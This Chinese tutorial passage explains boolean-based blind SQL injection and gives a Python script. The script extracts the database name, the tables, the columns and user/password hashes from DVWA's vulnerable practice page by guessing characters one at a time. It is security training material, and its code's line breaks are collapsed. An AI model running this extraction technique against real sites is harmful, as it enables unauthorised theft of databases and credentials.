2盲注入

盲注就是在sql注入过程中，sql语句执行的选择后，选择的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。

盲注的方法分布有布尔型注入 time注入，今天先来介绍布尔型注入

3exp原理  

![](../Images/ae461b22a5673adafc21f35b0ce5bec9.png)

编写exp的方法获取查询查询内容的长度 再用字符的ascii辩能力匹配猜解 如果匹配成功 页面存在exists即为准确的字符。接着将正确的字符进行累加直到退出，最后即为最终的要查询的内容。

#coding:utf8import requestsimport time
url="http://www.dvwa.com/vulnerabilities/sqli_blind/?id=1"cookies ={"PHPSESSID":"cmpfqe7ldmdm05mmagpktqaco4","security":"low"}dbname="database()"user="user()"password="(select concat(user,password) from users limit 1)"tables="(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database() limit 1)"columns="(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=0x7573657273 limit 1)"def get_lenth(sql):    n=1    while True:        req=requests.get(url=url+"'and length({})={}--%20&Submit=Submit#".format(sql,n),cookies=cookies)        if 'exists' in req.text:            break        n=n+1    return n
def get_data(sql):    payload = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.@_'    passwd=''    for i in range(1,get_lenth(sql)+1):        for p in payload:            turl=url+"'+and+ascii(substring({},{},1))={}--%20&Submit=Submit#".format(sql,i,ord(p))            req = requests.get(url=turl, cookies=cookies)            if 'exists' in req.text:                passwd+=p                print("[+]正在出数据[*]"+passwd)                break    return passwd
print("[*]数据库名：%s [*]" % get_data(dbname))print("[*]全部表名：%s [*]" % get_data(tables))print("[*]指定表的字段：%s [*]" % get_data(columns))print("[*]账号和密码：%s [*]" % get_data(password))
